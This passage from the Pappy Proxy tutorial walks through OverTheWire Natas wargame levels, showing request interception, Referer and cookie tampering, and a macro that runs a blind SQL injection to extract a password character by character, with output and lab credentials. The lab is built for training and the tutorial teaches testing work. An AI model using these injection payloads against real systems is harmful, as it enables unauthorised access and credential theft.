+<p>Now refresh the page in your browser. The page will hang like it&#8217;s taking a long time to load. Go back to Pappy, and now the interceptor will say something like:</p>
+<div class="highlight-python"><div class="highlight"><pre>Currently intercepting: Requests
+1 item(s) in queue.
+Press &#39;n&#39; to edit the next item or &#39;q&#39; to quit interceptor.
+</pre></div>
+</div>
+<p>Press <code class="docutils literal"><span class="pre">n</span></code> and the request will be opened for editing! Which editor is used is defined by the <code class="docutils literal"><span class="pre">EDITOR</span></code> environment variable. Use the text editor to add a <code class="docutils literal"><span class="pre">Referer</span></code> header (note that there&#8217;s only one r):</p>
+<div class="highlight-python"><div class="highlight"><pre>GET / HTTP/1.1
+Host: natas4.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664
+Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
+Connection: keep-alive
+Cache-Control: max-age=0
+Referer: http://natas5.natas.labs.overthewire.org/
+</pre></div>
+</div>
+<p>Save and quit, then press <code class="docutils literal"><span class="pre">q</span></code> to quit the interceptor. Go back to the browser and you should have the password for natas5! Yay!</p>
+<p>Now if you run ls, you&#8217;ll notice that the request we made has a <code class="docutils literal"><span class="pre">q</span></code> in the <code class="docutils literal"><span class="pre">Mngl</span></code> column. This means that we mangled the request. If there&#8217;s an <code class="docutils literal"><span class="pre">s</span></code> in that column, it means we mangled the response. If we ever want to refer to the unmangled version of the request, just prefix the id with a u. For example, you can get the unmangled version of request <code class="docutils literal"><span class="pre">12</span></code> by using the id <code class="docutils literal"><span class="pre">u12</span></code>.</p>
+</div>
+<div class="section" id="natas-5">
+<h3>Natas 5<a class="headerlink" href="#natas-5" title="Permalink to this headline">¶</a></h3>
+<p>This one starts with a screen saying you&#8217;re not logged in. This is fine. For this one, you&#8217;ll need to use the interceptor to edit the value of a cookie. I&#8217;ll let you figure that one out.</p>
+</div>
+<div class="section" id="natas-6">
+<h3>Natas 6<a class="headerlink" href="#natas-6" title="Permalink to this headline">¶</a></h3>
+<p>This one you should be able to get</p>
+</div>
+<div class="section" id="natas-7">
+<h3>Natas 7<a class="headerlink" href="#natas-7" title="Permalink to this headline">¶</a></h3>
+<p>You should get this one. Note the hint on the <a class="reference external" href="http://overthewire.org/wargames/natas/">overthewire website</a>: All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.</p>
+</div>
+<div class="section" id="natas-8">
+<h3>Natas 8<a class="headerlink" href="#natas-8" title="Permalink to this headline">¶</a></h3>
+<p>You should be able to get this one. If it sucks, google it.</p>
+</div>
+<div class="section" id="natas-9">
+<h3>Natas 9<a class="headerlink" href="#natas-9" title="Permalink to this headline">¶</a></h3>
+<p>For this one, when you view the source you&#8217;ll notice they&#8217;re taking value you entered and inserting it directly into a command line command to grep a file. What we want to do is insert our own arguments to the command. For this one, we will learn how to use the repeater. Here is the command we will learn:</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">rp</span> <span class="pre">&lt;reqid&gt;</span></code> Open the vim repeater with the given request</li>
+<li><code class="docutils literal"><span class="pre">&lt;leader&gt;f</span></code> (In the repeater) forward the request</li>
+</ul>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">Use <code class="docutils literal"><span class="pre">:wq!</span></code> to quit the repeater without having to save buffers</p>
+</div>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">You must know the basics of how to use vim for the repeater and have a key bound to the leader. You can find more information on the leader key <code class="docutils literal"><span class="pre">here</span> <span class="pre">&lt;https://stackoverflow.com/questions/1764263/what-is-the-leader-in-a-vimrc-file&gt;</span></code>. By default &lt;leader&gt; is bound to <code class="docutils literal"><span class="pre">\</span></code>.</p>
+</div>
+<dl class="docutils">
+<dt>Submit a request then open that request in the repeater.::</dt>
+<dd>itsPappyTime&gt; ls
+196  GET   natas9.natas.labs.overthewire.org  /index.php?needle=ball&amp;submit=Search      200 OK            0        1686     0.27  &#8211;
+195  GET   natas9.natas.labs.overthewire.org  /index-source.html                        200 OK            0        1952     0.27  &#8211;
+... snip ...
+itsPappyTime&gt; rp 196</dd>
+</dl>
+<p>Vim will open up in a vertical split with the request on the left and the response on the right.</p>
+<p>In the repeater, you edit the response on the left, then press the <code class="docutils literal"><span class="pre">&lt;leader&gt;</span></code> key then <code class="docutils literal"><span class="pre">f</span></code> to submit the modified request (note that your cursor must be in the left window). The response will then be put in the right window. This makes it easy to quickly make requests which are all slight variations of each other.</p>
+<p>In this case, we&#8217;ll be editing the <code class="docutils literal"><span class="pre">needle</span></code> get parameter. Try changing &#8220;ball&#8221; to &#8220;bill&#8221; and submitting it. You&#8217;ll notice that the output in the right window changes to contain words that have the word &#8220;bill&#8221; in them. The repeater will make it easy to make tweaks to your payload and get quick feedback without having to use the browser.</p>
+<p>Use the repeater to solve this challenge (you may need to url encode some characters by hand, unfortunately).</p>
+</div>
+<div class="section" id="skip-a-few-natas-15">
+<h3>Skip a few... Natas 15<a class="headerlink" href="#skip-a-few-natas-15" title="Permalink to this headline">¶</a></h3>
+<p>All the challenges up to this point should be doable with the repeater/interceptor. Natas15 is where things get hairy though. This is a blind SQL injection, and you&#8217;ll have to write a script to do it. Luckily for us, writing scripts using Pappy is easy. If you&#8217;re lazy and don&#8217;t want to actually do the challenges, google the password for natas15 then come back.</p>
+<p>Commands we&#8217;ll learn:</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">gma</span> <span class="pre">&lt;name&gt;</span> <span class="pre">&lt;reqid(s)&gt;</span></code> Generate a macro with objects pre-defined for the given requests</li>
+<li><code class="docutils literal"><span class="pre">lma</span></code> Load macros</li>
+<li><code class="docutils literal"><span class="pre">rma</span> <span class="pre">&lt;name&gt;</span> <span class="pre">[args]</span></code> Run a macro, optionally with arguments</li>
+</ul>
+<p>So the first thing we&#8217;ll do is submit a request to have a base request that we can modify. Submit a request with any username. You should get a response back saying the user doesn&#8217;t exist. Now we&#8217;ll generate a macro and use that request as a base for our script:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; ls
+ID   Verb  Host                                Path                                      S-Code            Req Len  Rsp Len  Time  Mngl
+224  POST  natas15.natas.labs.overthewire.org  /index.php                                200 OK            14       937      0.27  --
+223  POST  natas15.natas.labs.overthewire.org  /index.php                                200 OK            12       937      0.27  --
+222  GET   natas15.natas.labs.overthewire.org  /index-source.html                        200 OK            0        3325     0.28  --
+221  GET   natas15.natas.labs.overthewire.org  /favicon.ico                              404 Not Found     0        308      0.25  --
+220  GET   natas15.natas.labs.overthewire.org  /favicon.ico                              404 Not Found     0        308      0.27  --
+219  GET   natas15.natas.labs.overthewire.org  /                                         200 OK            0        1049     0.37  --
+218  GET   natas15.natas.labs.overthewire.org  /                                         401 Unauthorized  0        480      0.27  --
+... snip ...
+
+itsPappyTime&gt; gma brute 224
+Wrote script to macro_brute.py
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>Now open up <code class="docutils literal"><span class="pre">macro_brute.py</span></code> in your favorite text editor. You should have a script that looks like this:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">pappyproxy.http</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">get_request</span><span class="p">,</span> <span class="n">post_request</span>
+<span class="kn">from</span> <span class="nn">pappyproxy.context</span> <span class="kn">import</span> <span class="n">set_tag</span>
+
+<span class="n">MACRO_NAME</span> <span class="o">=</span> <span class="s">&#39;Macro 41855887&#39;</span>
+<span class="n">SHORT_NAME</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+
+<span class="c">###########</span>
+<span class="c">## Requests</span>
+<span class="c"># It&#39;s suggested that you call .copy() on these and then edit attributes</span>
+<span class="c"># as needed to create modified requests</span>
+<span class="c">##</span>
+
+
+<span class="n">req1</span> <span class="o">=</span> <span class="n">Request</span><span class="p">((</span>
+    <span class="s">&#39;POST /index.php HTTP/1.1</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Host: natas15.natas.labs.overthewire.org</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Accept-Language: en-US,en;q=0.5</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Referer: http://natas15.natas.labs.overthewire.org/</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Connection: keep-alive</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Content-Length: 14</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;username=admin&#39;</span>
+<span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">run_macro</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+    <span class="c"># Example:</span>
+    <span class="c"># req = req0.copy() # Copy req0</span>
+    <span class="c"># req.submit() # Submit the request to get a response</span>
+    <span class="c"># print req.response.raw_headers # print the response headers</span>
+    <span class="c"># req.save() # save the request to the data file</span>
+    <span class="c"># or copy req0 into a loop and use string substitution to automate requests</span>
+    <span class="k">pass</span>
+</pre></div>
+</div>
+<p>Pappy will generate a script and create a <code class="docutils literal"><span class="pre">Request</span></code> object that you can use. Check out the real documentation to see everything you can do with a <code class="docutils literal"><span class="pre">Request</span></code> object. For now you just need to know a few things about it:</p>
+<ul class="simple">
+<li><a class="reference internal" href="pappyproxy.html#pappyproxy.http.Request.submit" title="pappyproxy.http.Request.submit"><code class="xref py py-func docutils literal"><span class="pre">submit()</span></code></a> Submit the request and store the response object</li>
+<li><a class="reference internal" href="pappyproxy.html#pappyproxy.http.Request.save" title="pappyproxy.http.Request.save"><code class="xref py py-func docutils literal"><span class="pre">save()</span></code></a> Save the request/response to the data file</li>
+<li><code class="docutils literal"><span class="pre">post_params</span></code> A <a class="reference internal" href="pappyproxy.html#pappyproxy.http.RepeatableDict" title="pappyproxy.http.RepeatableDict"><code class="xref py py-class docutils literal"><span class="pre">RepeatableDict</span></code></a> that represents the post parameters of the request. Can set/get prameters the same way as a dictionary.</li>
+</ul>
+<p>It is suggested you go through the documentation to learn the rest of the attributes/functions.</p>
+<p>To start out simple, we&#8217;ll write a macro that lets us check a username from the Pappy console. To define a function, you define the <code class="docutils literal"><span class="pre">run_macro</span></code> function. The function is passed a list of arguments which represent the arguments entered. Here a <code class="docutils literal"><span class="pre">run_macro</span></code> function that we can define that will check if a user exists:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="k">def</span> <span class="nf">run_macro</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+    <span class="n">to_check</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="c"># get the username to check</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">req1</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span> <span class="c"># make a copy of the base request</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">post_params</span><span class="p">[</span><span class="s">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_check</span> <span class="c"># set the username param of the request</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">submit</span><span class="p">()</span> <span class="c"># submit the request</span>
+    <span class="k">if</span> <span class="s">&quot;This user doesn&#39;t exist.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">raw_data</span><span class="p">:</span> <span class="c"># check if the username is valid</span>
+        <span class="k">print</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s"> is not a user&quot;</span> <span class="o">%</span> <span class="n">to_check</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s"> is a user!&quot;</span> <span class="o">%</span> <span class="n">to_check</span>
+</pre></div>
+</div>
+<p>Then to run it:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; lma
+Loaded &quot;&lt;Macro Macro 41855887 (brute)&gt;&quot;
+itsPappyTime&gt; rma brute admin
+admin is not a user
+itsPappyTime&gt; rma brute fooooo
+fooooo is not a user
+itsPappyTime&gt; rma brute natas16
+natas16 is a user!
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>Awesome! Notice how we didn&#8217;t have to deal with authentication either. This is because the authentication is handled by the <code class="docutils literal"><span class="pre">Authorization</span></code> header which was included in the generated request.</p>
+<p>Time to add the SQL injection part. If we look at the source, we see that this is the SQL query that checks the username:</p>
+<div class="highlight-python"><div class="highlight"><pre>$query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;
+</pre></div>
+</div>
+<p>So to escape it, we use a payload like:</p>
+<div class="highlight-python"><div class="highlight"><pre>username&quot; OR 1=1; #
+</pre></div>
+</div>
+<p>In this case, any username that ends in <code class="docutils literal"><span class="pre">&quot;</span> <span class="pre">OR</span> <span class="pre">1=1;</span> <span class="pre">#</span></code> will be considered a valid username. Let&#8217;s try this out:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; rma brute &quot;foo\&quot; OR 1=1;&quot;
+foo&quot; OR 1=1; is a user!
+itsPappyTime&gt; rma brute &quot;fooooooo\&quot; OR 1=1;&quot;
+fooooooo&quot; OR 1=1; is a user!
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>Great! Now we can check any true/false condition we want. In this case, we want to check if a certain character is at a certain position in the <code class="docutils literal"><span class="pre">password</span></code> column. We do this with the <code class="docutils literal"><span class="pre">ASCII</span></code> and <code class="docutils literal"><span class="pre">SUBSTRING</span></code> functions. So something like this will check if the first character is an <code class="docutils literal"><span class="pre">A</span></code>.:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="s">&#39;natas16&quot; AND ASCII(SUBSTRING(password, 0, 1)) = 41; #&#39;</span>
+</pre></div>
+</div>
+<p>Alright, let&#8217;s update our macro to find the first character of the password.:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">pappyproxy.http</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">get_request</span><span class="p">,</span> <span class="n">post_request</span>
+<span class="kn">from</span> <span class="nn">pappyproxy.context</span> <span class="kn">import</span> <span class="n">set_tag</span>
+
+<span class="n">MACRO_NAME</span> <span class="o">=</span> <span class="s">&#39;Macro 41855887&#39;</span>
+<span class="n">SHORT_NAME</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+
+<span class="c">###########</span>
+<span class="c">## Requests</span>
+<span class="c"># It&#39;s suggested that you call .copy() on these and then edit attributes</span>
+<span class="c"># as needed to create modified requests</span>
+<span class="c">##</span>
+
+
+<span class="n">req1</span> <span class="o">=</span> <span class="n">Request</span><span class="p">((</span>
+    <span class="s">&#39;POST /index.php HTTP/1.1</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Host: natas15.natas.labs.overthewire.org</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Accept-Language: en-US,en;q=0.5</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Referer: http://natas15.natas.labs.overthewire.org/</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Connection: keep-alive</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Content-Length: 14</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;username=admin&#39;</span>
+<span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">check_char</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;natas16&quot; AND ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s">, 1)) = </span><span class="si">%d</span><span class="s">; #&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">req1</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">post_params</span><span class="p">[</span><span class="s">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">submit</span><span class="p">()</span>
+    <span class="k">if</span> <span class="s">&quot;This user doesn&#39;t exist.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">raw_data</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">run_macro</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+    <span class="n">valid_chars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890&quot;</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">valid_chars</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">&#39;Trying </span><span class="si">%s</span><span class="s">...&#39;</span> <span class="o">%</span> <span class="n">c</span>
+        <span class="k">if</span> <span class="n">check_char</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
+            <span class="k">print</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> is the first char!&#39;</span> <span class="o">%</span> <span class="n">c</span>
+            <span class="k">return</span>
+    <span class="k">print</span> <span class="s">&quot;The script didn&#39;t work&quot;</span>
+</pre></div>
+</div>
+<p>And when we run it...:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; lma
+Loaded &quot;&lt;Macro Macro 41855887 (brute)&gt;&quot;
+itsPappyTime&gt; rma brute
+Trying a...
+Trying b...
+Trying c...
+Trying d...
+... snip ...
+Trying U...
+Trying V...
+Trying W...
+W is the first char!
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>We find the first character! Woo! Next we just have to do this for each position. Even through we don&#8217;t know the length of the password, we will know that the password is over when none of the characters are valid. So let&#8217;s update our macro:</p>
+<div class="highlight-python"><div class="highlight"><pre><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">pappyproxy.http</span> <span class="kn">import</span> <span class="n">Request</span><span class="p">,</span> <span class="n">get_request</span><span class="p">,</span> <span class="n">post_request</span>
+<span class="kn">from</span> <span class="nn">pappyproxy.context</span> <span class="kn">import</span> <span class="n">set_tag</span>
+
+<span class="n">MACRO_NAME</span> <span class="o">=</span> <span class="s">&#39;Macro 41855887&#39;</span>
+<span class="n">SHORT_NAME</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+
+<span class="c">###########</span>
+<span class="c">## Requests</span>
+<span class="c"># It&#39;s suggested that you call .copy() on these and then edit attributes</span>
+<span class="c"># as needed to create modified requests</span>
+<span class="c">##</span>
+
+
+<span class="n">req1</span> <span class="o">=</span> <span class="n">Request</span><span class="p">((</span>
+    <span class="s">&#39;POST /index.php HTTP/1.1</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Host: natas15.natas.labs.overthewire.org</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Accept-Language: en-US,en;q=0.5</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Referer: http://natas15.natas.labs.overthewire.org/</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Connection: keep-alive</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;Content-Length: 14</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;</span><span class="se">\r\n</span><span class="s">&#39;</span>
+    <span class="s">&#39;username=admin&#39;</span>
+<span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">check_char</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;natas16&quot; AND ASCII(SUBSTRING(password, </span><span class="si">%d</span><span class="s">, 1)) = </span><span class="si">%d</span><span class="s">; #&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">req1</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">post_params</span><span class="p">[</span><span class="s">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">submit</span><span class="p">()</span>
+    <span class="k">if</span> <span class="s">&quot;This user doesn&#39;t exist.&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">raw_data</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">run_macro</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+    <span class="n">valid_chars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890&quot;</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">done</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">done</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">valid_chars</span><span class="p">:</span>
+            <span class="c"># Print the current char to the current line</span>
+            <span class="k">print</span> <span class="n">c</span><span class="p">,</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+
+            <span class="c"># Check the current char</span>
+            <span class="k">if</span> <span class="n">check_char</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+                <span class="c"># We got the correct char!</span>
+                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
+                <span class="c"># Print it to the screen</span>
+                <span class="k">print</span> <span class="s">&#39;&#39;</span>
+                <span class="k">print</span> <span class="s">&#39;</span><span class="si">%s</span><span class="s"> is char </span><span class="si">%d</span><span class="s">!&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+                <span class="k">print</span> <span class="s">&#39;The password so far is </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">password</span>
+                <span class="c"># We have to do another round</span>
+                <span class="n">done</span> <span class="o">=</span> <span class="bp">False</span>
+                <span class="k">break</span>
+        <span class="k">if</span> <span class="n">done</span><span class="p">:</span>
+            <span class="c"># We got through the entire alphabet</span>
+            <span class="k">print</span> <span class="s">&#39;&#39;</span>
+            <span class="k">print</span> <span class="s">&#39;Done! The password is &quot;</span><span class="si">%s</span><span class="s">&quot;&#39;</span> <span class="o">%</span> <span class="n">password</span>
+            <span class="k">break</span>
+</pre></div>
+</div>
+<p>Then we run it:</p>
+<div class="highlight-python"><div class="highlight"><pre>itsPappyTime&gt; lma
+Loaded &quot;&lt;Macro Macro 41855887 (brute)&gt;&quot;
+itsPappyTime&gt; rma brute
+a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W
+W is char 1!
+The password so far is W
+a
+a is char 2!
+The password so far is Wa
+a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I
+I is char 3!
+The password so far is WaI
+a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H
+H is char 4!
+The password so far is WaIH
+a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E
+
+... snip ...
+
+The password so far is WaIHEacj63wnNIBROHeqi3p9t0m5nh
+a b c d e f g h i j k l m
+m is char 31!
+The password so far is WaIHEacj63wnNIBROHeqi3p9t0m5nhm
+a b c d e f g h
+h is char 32!
+The password so far is WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 0
+Done! The password is &quot;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&quot;
+itsPappyTime&gt;
+</pre></div>
+</div>
+<p>Boom! There it is!</p>
+</div>
+</div>
+<div class="section" id="conclusion">
+<h2>Conclusion<a class="headerlink" href="#conclusion" title="Permalink to this headline">¶</a></h2>
+<p>That&#8217;s pretty much all you need to get started with Pappy. Make sure to go through the documentation to learn about all the other features that weren&#8217;t covered in this tutorial. Hopefully you didn&#8217;t find Pappy too hard to use and you&#8217;ll consider it for your next engagement.</p>
+</div>
+</div>
+
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+  <h3><a href="index.html">Table Of Contents</a></h3>
+  <ul>
+<li><a class="reference internal" href="#">The Pappy Proxy Tutorial</a><ul>
+<li><a class="reference internal" href="#table-of-contents">Table of Contents</a></li>
+<li><a class="reference internal" href="#getting-set-up">Getting Set Up</a><ul>
+<li><a class="reference internal" href="#introduction">Introduction</a></li>
+<li><a class="reference internal" href="#getting-started">Getting Started</a></li>
+<li><a class="reference internal" href="#installing-pappy-s-ca-cert">Installing Pappy&#8217;s CA Cert</a><ul>
+<li><a class="reference internal" href="#installing-the-cert-in-firefox">Installing the Cert in Firefox</a></li>
+<li><a class="reference internal" href="#installing-the-cert-in-chrome">Installing the Cert in Chrome</a></li>
+<li><a class="reference internal" href="#installing-the-cert-in-safari">Installing the Cert in Safari</a></li>
+<li><a class="reference internal" href="#installing-the-cert-in-internet-explorer">Installing the Cert in Internet Explorer</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#configuring-your-browser">Configuring Your Browser</a></li>
